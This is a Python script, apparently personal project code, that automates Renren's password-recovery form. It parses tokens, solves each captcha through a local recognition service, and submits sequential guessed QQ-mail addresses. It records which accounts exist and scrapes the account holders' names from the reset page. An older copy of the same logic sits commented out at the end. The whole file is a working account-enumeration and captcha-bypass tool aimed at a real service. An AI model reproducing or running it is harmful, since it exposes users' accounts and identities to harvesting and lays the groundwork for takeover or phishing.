import requests
import time
import json
from bs4 import BeautifulSoup
import re

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
}
recurl = "http://127.0.0.1:6000/b"
url1 = "https://safe.renren.com/standalone/findpwd#nogo"
url2 = "https://safe.renren.com/standalone/findpwd/inputaccount"


def get_firstpage(url, headers, session):  # 获取第一个页面的html
    response = session.get(url, headers=headers)
    html = response.text
    return html


def get_firstpageinfo(html):  # 解析第一个页面的html，获取token
    soup = BeautifulSoup(html, "lxml")
    listofinput = soup.find_all("input")
    for i in listofinput:
        if i["name"] == "_captcha_type":
            _captcha_type = i["value"]
        if i["name"] == "action_token":
            action_token = i["value"]
    tokengroup1 = re.search('page_token.*?(";)', html)
    tokengroup2 = re.search('".*?"', tokengroup1.group())
    token = re.sub('["]', '', tokengroup2.group())
    dict = {"_captcha_type": _captcha_type, "action_token": action_token, "token": token}
    return dict


def download_cap(html, account, session):  # 保存验证码
    capchoose = re.search('rk=800&t=safecenter_.*?(\d")', html)
    capdol = "http://icode.renren.com/getcode.do?" + capchoose.group()
    capimg = session.get(capdol)
    with open("C:/data/project/newrenren/tu/" + str(account) + ".jpg", "wb") as wf:
        wf.write(capimg.content)


def rec_cap(recurl, capfiles):  # 调用接口识别验证码
    r = requests.post(url=recurl, files=capfiles)
    res = json.loads(r.text)
    captcha = res["value"]
    return captcha


def set_payload(action_token, account, _captcha_type, captcha, token):  # 设置表单
    payload = {"action_token": action_token,
               "domain": "renren.com",
               "account": str(account) + "66@qq.com",
               "_captcha_type": _captcha_type,
               "captcha": captcha,
               "ajax-type": "json",
               "token": token,
               "_rtk": "dbdaad19"}
    return payload


def post_payload(url, payload, headers, session):  # post表单跳转到第二个页面
    response = session.post(url, data=payload, headers=headers)
    return response


def get_resname(url):  # 获取对应姓名信息
    nre = requests.get(url)
    soup = BeautifulSoup(nre.text, "lxml")
    listofrsp = soup.find_all("p")
    resname = re.search('title=".*?>', str(listofrsp))
    return resname.group()


def dealwith_result(response, account, startnum):  # 处理返回结果
    result = re.search('"code".*?(\d)', response.text)
    if result.group() == '"code":0':  # 记录成功
        with open("1.txt", "a") as rwf:
            rwf.write(str(account) + "66@qq.com\n")
        r2cont = response.content
        nurl1 = re.search('\?.*(",)', str(r2cont))
        nurl2 = re.sub('["],', '', nurl1.group())
        nameurl = "http://safe.renren.com/standalone/findpwd/resetpwd" + nurl2
        resname = get_resname(nameurl)
        with open("name.txt", "a") as rwf:
            rwf.write(resname + str(account) + "66@qq.com\n")
        print("记录成功")
    elif result.group() == '"code":5':  # 验证码错误，账号不存在，账号封禁
        errresult = re.search('"error_text".*?("})', response.text)
        if (errresult):
            if errresult.group() == '"error_text":"验证码不正确"}':
                print("验证码不正确")
                startnum = startnum - 1
            else:
                print("账号不存在")
        else:
            print(response.text)
    else:  # 服务器繁忙，其他未知错误
        try:
            serresult = re.search('服务.*?(再试)', response.text)
            print(serresult.group())
            startnum = startnum - 1
            time.sleep(5)
        except:
            print(response.text)


def main():
    startnum = 1570272

    while startnum < 1570273:  # 1570272  15800001
        # 初始化
        s = requests.session()
        account = startnum

        html = get_firstpage(url1, headers, s)

        _captcha_type = get_firstpageinfo(html)["_captcha_type"]
        action_token = get_firstpageinfo(html)["action_token"]
        token = get_firstpageinfo(html)["token"]

        download_cap(html, account, s)

        capfiles = {'image_file': (
            'C:/data/project/newrenren/tu/', open('C:/data/project/newrenren/tu/' + str(account) + '.jpg', 'rb'),
            'application')
        }
        captcha = rec_cap(recurl, capfiles)

        payload = set_payload(action_token, account, _captcha_type, captcha, token)

        response = post_payload(url2, payload, headers, s)

        dealwith_result(response, account, startnum)

        startnum += 1
        # 每个循环记录进度
        with open("p.txt", "w") as rwf:
            rwf.write(str(account) + "66@qq.com")


main()

'''老版本
import requests
# from selenium import webdriver
import time
import json
from bs4 import BeautifulSoup
import re
from PIL import Image

# import pytesseract

# 请注意，遇到未知会返回response.text结果

def get_resname(url):
    nre = requests.get(url)
    soup = BeautifulSoup(nre.text, "lxml")
    listofrsp = soup.find_all("p")
    resname = re.search('title=".*?>', str(listofrsp))
    return resname.group()

startnum = 1570272

while startnum < 1570273:  #    1570272  15800001
    # 初始化
    s = requests.session()
    account = startnum
    # 浏览器输入chrome://version/查看用户代理
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"}

    # 访问主页
    response1 = s.get("https://safe.renren.com/standalone/findpwd#nogo", headers=headers)
    html = response1.text
    soup1 = BeautifulSoup(html, "lxml")

    # 提取表单数据
    listofinput = soup1.find_all("input")
    for i in listofinput:
        if i["name"] == "_captcha_type":
            _captcha_type = i["value"]
        if i["name"] == "action_token":
            action_token = i["value"]

    tokengroup1 = re.search('page_token.*?(";)', html)
    tokengroup2 = re.search('".*?"', tokengroup1.group())
    token = re.sub('["]', '', tokengroup2.group())

    # 验证码保存
    capchoose = re.search('rk=800&t=safecenter_.*?(\d")', html)
    capdol = "http://icode.renren.com/getcode.do?" + capchoose.group()
    capimg = s.get(capdol)
    with open("C:/data/project/renren/tu/" + str(account) + ".jpg", "wb") as wf:
        wf.write(capimg.content)




    验证码识别
    # print(pytesseract.image_to_string(Image.open("C:/资料/project/renren/tu/" + str(account) + ".jpg")))
    url = "http://127.0.0.1:6000/b"
    files = {'image_file': (
    'C:/data/project/renren/tu/', open('C:/data/project/renren/tu/' + str(account) + '.jpg', 'rb'), 'application')}
    r = requests.post(url=url, files=files)
    res = json.loads(r.text)
    captcha = res["value"]




    # 设置表单数据
    payload = {"action_token": action_token,
               "domain": "renren.com",
               "account": str(account) + "66@qq.com",
               "_captcha_type": _captcha_type,
               "captcha": captcha,
               "ajax-type": "json",
               "token": token,
               "_rtk": "dbdaad19"}

    # 发送表单并处理结果
    response2 = s.post("https://safe.renren.com/standalone/findpwd/inputaccount", data=payload, headers=headers)
    result = re.search('"code".*?(\d)', response2.text)
    if result.group() == '"code":0':  # 记录成功
        with open("1.txt", "a") as rwf:
            rwf.write(str(account) + "66@qq.com\n")
        r2cont = response2.content
        nurl1 = re.search('\?.*(",)', str(r2cont))
        nurl2 = re.sub('["],', '', nurl1.group())
        nameurl = "http://safe.renren.com/standalone/findpwd/resetpwd" + nurl2

        resname=get_resname(nameurl)
        with open("name.txt", "a") as rwf:
            rwf.write(resname + str(account) + "66@qq.com\n")
        print("记录成功")

    elif result.group() == '"code":5':  # 验证码错误，账号不存在，账号封禁
        errresult = re.search('"error_text".*?("})', response2.text)
        if (errresult):
            if errresult.group() == '"error_text":"验证码不正确"}':
                print("验证码不正确")
                startnum = startnum - 1
            else:
                print("账号不存在")

        else:
            print(response2.text)
    else:  # 服务器繁忙，其他未知错误
        try:
            serresult = re.search('服务.*?(再试)', response2.text)
            print(serresult.group())
            startnum = startnum - 1
            time.sleep(5)
        except:
            print(response2.text)

    startnum += 1

    # 每个循环记录进度
    with open("p.txt", "w") as rwf:
        rwf.write(str(account) + "66@qq.com")





'''
